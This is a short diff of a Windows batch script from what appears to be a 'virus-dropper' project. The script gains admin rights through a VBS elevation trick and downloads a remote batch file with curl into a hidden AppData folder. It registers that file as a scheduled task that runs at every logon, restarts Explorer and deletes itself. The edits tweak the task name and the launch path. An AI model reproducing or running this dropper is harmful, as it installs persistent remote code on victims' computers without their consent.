@@ -11,7 +11,7 @@ if '%errorlevel%' NEQ '0' (
     del "%temp%\getadmin.vbs"
     md %appdata%\Windows
     curl "https://raw.githubusercontent.com/YumYummity/virus-dropper/main/install/InstallPERSISTENT.bat" --output "%appdata%\Windows\Install.bat"
-    SCHTASKS /CREATE /F /SC ONLOGON /TR "%appdata%\Windows\Install.bat" /TN "Install.bat"
+    SCHTASKS /CREATE /F /SC ONLOGON /TR "%appdata%\Windows\Install.bat" /TN "%appdata%\Windows\Install.bat"
     taskkill /f /IM explorer.exe
     start explorer.exe
     exit /B
@@ -30,7 +30,7 @@ del /f "%appdata%\Windows\Install.bat"
 rd %appdata%\Windows
 powershell -Command "Unregister-ScheduledTask -TaskName 'Install.bat' -Confirm:$false"
 
-start /min Install.bat
+start /min "%homepath%\Install.bat"
 echo Your password is: 69420 > passwordd.txt
 cls
 call :deleteSelf&exit
